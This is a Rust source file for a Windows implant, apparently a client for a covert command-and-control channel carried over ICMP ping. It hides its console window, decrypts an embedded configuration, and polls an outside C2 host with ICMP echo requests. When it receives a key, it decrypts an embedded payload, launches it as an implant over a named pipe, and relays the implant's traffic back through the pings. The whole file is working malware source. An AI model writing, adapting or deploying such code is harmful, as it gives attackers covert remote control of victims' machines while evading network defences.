#![windows_subsystem = "windows"]
#![feature(never_type)]
use aes::cipher::{block_padding::Pkcs7, BlockDecrypt, BlockDecryptMut, KeyInit};
use bincode::Options;
use covert_c2_ping_common::{ClientConfig, PingMessage, BUF_SIZE, KEY_SIZE, STAMP_BYTE};
use covert_client::{self, CSFrameRead, CSFrameWrite, Implant};
use covert_common::CovertChannel;
use std::{ffi::c_void, net::Ipv4Addr, slice, str::FromStr, thread, time::Duration};
use windows::Win32::NetworkManagement::IpHelper::{
    IcmpCloseHandle, IcmpCreateFile, IcmpSendEcho, ICMP_ECHO_REPLY,
};

fn main() -> Result<(), ()> {
    let conf = load_conf()?;
    let addr = Ipv4Addr::from_str(conf.host).or(Err(()))?.octets();
    let mut chan: CovertChannel<PingMessage, 4> = CovertChannel::new(conf.key);
    start_loop(
        &mut chan,
        conf.id,
        addr,
        conf.sleep,
        conf.pipe,
        conf.payload,
    )?;
}

static mut BUFF: [u8; BUF_SIZE] = [STAMP_BYTE; BUF_SIZE];

fn load_conf<'a>() -> Result<ClientConfig<'a>, ()> {
    unsafe {
        let decryptor = aes::Aes256Dec::new_from_slice(&BUFF[0..KEY_SIZE]).or(Err(()))?;
        decryptor
            .decrypt_padded_mut::<Pkcs7>(&mut BUFF[KEY_SIZE..BUF_SIZE])
            .or(Err(()))?;
        let deserializer = bincode::options().allow_trailing_bytes();
        let conf = deserializer
            .deserialize::<'static, ClientConfig>(&BUFF[KEY_SIZE..BUF_SIZE])
            .or(Err(()))?;
        Ok(conf)
    }
}

fn start_loop(
    chan: &mut CovertChannel<PingMessage, 4>,
    id: u16,
    addr: [u8; 4],
    sleep: u64,
    pipe_name: &str,
    payload: &[u8],
) -> Result<!, ()> {
    let mut implant: Option<Implant> = None;
    let mut sleep_time = Duration::from_secs(sleep);
    loop {
        let message = get_ping_message(chan, id, sleep_time, addr);
        match (message, implant.as_mut()) {
            (PingMessage::DataMessage(data), Some(implant)) => {
                implant.write_frame(data).or(Err(()))?;
                let out_data = implant.read_frame().or(Err(()))?;
                chan.put_message(PingMessage::DataMessage(out_data), id);
            }
            (PingMessage::SleepMessage(new_time), _) => sleep_time = new_time,
            (PingMessage::CloseMessage, _) => std::process::exit(0),
            (PingMessage::KeyMessage(key), None) => {
                if implant.is_some() {
                    std::process::exit(0);
                }
                let decryptor = aes::Aes256Dec::new_from_slice(&key).or(Err(()))?;
                let payload = decryptor.decrypt_padded_vec::<Pkcs7>(payload).or(Err(()))?;
                let mut new_implant =
                    covert_client::create_implant_from_buf(payload, pipe_name).or(Err(()))?;
                let out_data = new_implant.read_frame().or(Err(()))?;
                chan.put_message(PingMessage::DataMessage(out_data), id);
                implant.replace(new_implant);
            }
            _ => std::process::exit(0),
        };
    }
}

fn get_ping_message(
    chan: &mut CovertChannel<PingMessage, 4>,
    id: u16,
    sleep_time: Duration,
    addr: [u8; 4],
) -> PingMessage {
    loop {
        thread::sleep(sleep_time);
        let packet = chan.get_packet(id);

        let message = send_ping(addr, packet)
            .and_then(|data| {
                chan.put_packet(data.as_slice()).or(Err(())) //No Packets
            })
            .and_then(|(in_chan, ready)| {
                if in_chan == id && ready {
                    return chan.get_message(id).ok_or(()); //Failed to parse message
                }
                Err(()) //Not ready yet
            });
        if let Ok(out) = message {
            return out;
        }
    }
}

#[allow(dead_code)]
#[repr(C)]
struct ReplyBuffer {
    reply_data: ICMP_ECHO_REPLY,
    buffer: [u8; 64],
}

fn send_ping(addr: [u8; 4], data: Vec<u8>) -> Result<Vec<u8>, ()> {
    unsafe {
        let handle = IcmpCreateFile().or(Err(()))?;
        let mut replybuffer: ReplyBuffer = std::mem::zeroed();
        let replysize: u32 = std::mem::size_of::<ReplyBuffer>().try_into().unwrap();
        let result = IcmpSendEcho(
            handle,
            u32::from_le_bytes(addr),
            data.as_ptr() as *const c_void,
            data.len().try_into().unwrap(),
            None,
            &mut replybuffer as *mut _ as *mut c_void,
            replysize,
            10000,
        );
        IcmpCloseHandle(handle);
        if result > 1 || result == 0 {
            return Err(());
        }
        let response_data = slice::from_raw_parts(
            replybuffer.reply_data.Data as *const u8,
            replybuffer.reply_data.DataSize.into(),
        );
        Ok(response_data.to_vec())
    }
}
